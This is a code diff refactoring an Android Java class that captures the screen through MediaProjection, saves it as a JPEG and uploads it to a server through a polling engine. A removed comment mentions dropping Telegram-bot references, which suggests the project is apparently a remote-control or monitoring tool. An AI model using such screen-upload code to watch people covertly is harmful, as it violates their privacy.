@@ -19,11 +19,13 @@ import java.io.IOException;
 import java.nio.ByteBuffer;
 
 /**
- * ScreenCapture
+ * ScreenCapture — захват экрана и отправка на сервер.
  *
- * Захват экрана через MediaProjection (Android 12+).
- * После захвата отправляет JPEG на сервер через HttpPollingEngine.uploadScreenshot().
- * Никаких ссылок на Telegram, chatId или TelegramEngine.
+ * Поток работы:
+ *   ScreenCaptureRequestActivity (получает разрешение)
+ *     → ScreenCaptureService (инициализирует MediaProjection)
+ *       → ScreenCapture.captureAndUpload()
+ *         → HttpPollingEngine.uploadScreenshot()
  */
 public class ScreenCapture {
 
@@ -34,174 +36,111 @@ public class ScreenCapture {
     private static ImageReader      imageReader;
 
     // ──────────────────────────────────────────────────
-    //  Init / Release
-    // ──────────────────────────────────────────────────
 
-    /**
-     * Сохраняет MediaProjection. Вызывается из ScreenCaptureService.onStartCommand().
-     */
     public static void initProjection(MediaProjection projection, Context context) {
         activeProjection = projection;
-        Log.i(TAG, "MediaProjection initialized");
-
         if (projection != null) {
             projection.registerCallback(new MediaProjection.Callback() {
-                @Override
-                public void onStop() {
-                    Log.w(TAG, "MediaProjection stopped externally");
-                    release();
-                }
+                @Override public void onStop() { release(); }
             }, null);
         }
+        Log.i(TAG, "Projection initialized");
     }
 
-    /**
-     * Освобождает все ресурсы. Вызывается из ScreenCaptureService.onDestroy().
-     */
     public static void release() {
         releaseDisplayResources();
         if (activeProjection != null) {
             try { activeProjection.stop(); } catch (Exception ignored) {}
             activeProjection = null;
         }
-        Log.i(TAG, "ScreenCapture released");
     }
 
     // ──────────────────────────────────────────────────
-    //  Capture entry point
+    //  Capture + upload
     // ──────────────────────────────────────────────────
 
-    /**
-     * Делает скриншот и загружает его на сервер через HttpPollingEngine.
-     * Вызывается из ScreenCaptureService после получения MediaProjection.
-     *
-     * @param context контекст
-     * @param engine  HttpPollingEngine для загрузки файла
-     */
     public static void captureAndUpload(Context context, HttpPollingEngine engine) {
         if (activeProjection == null) {
-            Log.e(TAG, "captureAndUpload: projection is null");
+            Log.e(TAG, "captureAndUpload: no projection");
             return;
         }
 
-        // Получаем размеры экрана
         WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
-        DisplayMetrics metrics = new DisplayMetrics();
+        DisplayMetrics dm = new DisplayMetrics();
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            android.view.WindowMetrics wMetrics = wm.getCurrentWindowMetrics();
-            metrics.widthPixels  = wMetrics.getBounds().width();
-            metrics.heightPixels = wMetrics.getBounds().height();
-            metrics.densityDpi   = context.getResources().getDisplayMetrics().densityDpi;
+            android.view.WindowMetrics wm2 = wm.getCurrentWindowMetrics();
+            dm.widthPixels  = wm2.getBounds().width();
+            dm.heightPixels = wm2.getBounds().height();
+            dm.densityDpi   = context.getResources().getDisplayMetrics().densityDpi;
         } else {
-            wm.getDefaultDisplay().getRealMetrics(metrics);
+            wm.getDefaultDisplay().getRealMetrics(dm);
         }
 
-        int width   = metrics.widthPixels;
-        int height  = metrics.heightPixels;
-        int density = metrics.densityDpi;
-
-        Log.d(TAG, "Capturing: " + width + "x" + height);
-
-        // Сбрасываем предыдущие ресурсы
         releaseDisplayResources();
 
-        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
+        imageReader = ImageReader.newInstance(dm.widthPixels, dm.heightPixels,
+                PixelFormat.RGBA_8888, 2);
 
         virtualDisplay = activeProjection.createVirtualDisplay(
-                "RCCapture",
-                width, height, density,
+                "RC", dm.widthPixels, dm.heightPixels, dm.densityDpi,
                 DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
-                imageReader.getSurface(),
-                null, null
-        );
+                imageReader.getSurface(), null, null);
 
         imageReader.setOnImageAvailableListener(reader -> {
-            // Убираем listener сразу — нам нужен один кадр
             reader.setOnImageAvailableListener(null, null);
-
             Image image = null;
-            Bitmap bitmap = null;
+            Bitmap bmp  = null;
             try {
-                // Небольшая пауза для стабилизации кадра
-                Thread.sleep(300);
-
+                Thread.sleep(250); // стабилизация кадра
                 image = reader.acquireLatestImage();
-                if (image == null) {
-                    Log.w(TAG, "acquireLatestImage returned null");
-                    return;
-                }
-
-                bitmap = imageToBitmap(image, width, height);
-                File file = bitmapToJpeg(context, bitmap, 80);
-
-                if (file != null && engine != null) {
-                    // Загружаем в фоновом потоке (listener уже в не-UI потоке)
-                    engine.uploadScreenshot(file);
-                }
-
+                if (image == null) return;
+                bmp = imageToBitmap(image, dm.widthPixels, dm.heightPixels);
+                File file = bitmapToJpeg(context, bmp, 75);
+                if (file != null && engine != null) engine.uploadScreenshot(file);
             } catch (Exception e) {
                 Log.e(TAG, "Capture error: " + e.getMessage());
             } finally {
-                if (image  != null) image.close();
-                if (bitmap != null) bitmap.recycle();
+                if (image != null) image.close();
+                if (bmp   != null) bmp.recycle();
                 releaseDisplayResources();
             }
         }, null);
     }
 
     // ──────────────────────────────────────────────────
-    //  Bitmap helpers
-    // ──────────────────────────────────────────────────
 
-    private static Bitmap imageToBitmap(Image image, int width, int height) {
-        Image.Plane[] planes    = image.getPlanes();
-        ByteBuffer    buffer    = planes[0].getBuffer();
-        int pixelStride         = planes[0].getPixelStride();
-        int rowStride           = planes[0].getRowStride();
-        int rowPadding          = rowStride - pixelStride * width;
+    private static Bitmap imageToBitmap(Image image, int w, int h) {
+        Image.Plane[] planes  = image.getPlanes();
+        ByteBuffer    buffer  = planes[0].getBuffer();
+        int pixelStride       = planes[0].getPixelStride();
+        int rowStride         = planes[0].getRowStride();
+        int rowPadding        = rowStride - pixelStride * w;
 
-        Bitmap bmp = Bitmap.createBitmap(
-                width + rowPadding / pixelStride,
-                height,
-                Bitmap.Config.ARGB_8888
-        );
+        Bitmap bmp = Bitmap.createBitmap(w + rowPadding / pixelStride, h, Bitmap.Config.ARGB_8888);
         bmp.copyPixelsFromBuffer(buffer);
 
-        // Обрезаем padding справа если есть
         if (rowPadding != 0) {
-            Bitmap cropped = Bitmap.createBitmap(bmp, 0, 0, width, height);
+            Bitmap cropped = Bitmap.createBitmap(bmp, 0, 0, w, h);
             bmp.recycle();
             return cropped;
         }
         return bmp;
     }
 
-    private static File bitmapToJpeg(Context context, Bitmap bitmap, int quality) {
-        File file = new File(context.getCacheDir(),
-                "sc_" + System.currentTimeMillis() + ".jpg");
-        try (FileOutputStream fos = new FileOutputStream(file)) {
-            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, fos);
-            fos.flush();
-            Log.d(TAG, "JPEG saved: " + file.length() / 1024 + " KB → " + file.getName());
-            return file;
+    private static File bitmapToJpeg(Context ctx, Bitmap bmp, int quality) {
+        File f = new File(ctx.getCacheDir(), "sc_" + System.currentTimeMillis() + ".jpg");
+        try (FileOutputStream fos = new FileOutputStream(f)) {
+            bmp.compress(Bitmap.CompressFormat.JPEG, quality, fos);
+            return f;
         } catch (IOException e) {
-            Log.e(TAG, "bitmapToJpeg error: " + e.getMessage());
+            Log.e(TAG, "JPEG error: " + e.getMessage());
             return null;
         }
     }
 
-    // ──────────────────────────────────────────────────
-    //  Cleanup
-    // ──────────────────────────────────────────────────
-
     private static void releaseDisplayResources() {
-        if (virtualDisplay != null) {
-            try { virtualDisplay.release(); } catch (Exception ignored) {}
-            virtualDisplay = null;
-        }
-        if (imageReader != null) {
-            try { imageReader.close(); } catch (Exception ignored) {}
-            imageReader = null;
-        }
+        if (virtualDisplay != null) { try { virtualDisplay.release(); } catch (Exception ignored) {} virtualDisplay = null; }
+        if (imageReader    != null) { try { imageReader.close();      } catch (Exception ignored) {} imageReader    = null; }
     }
 }
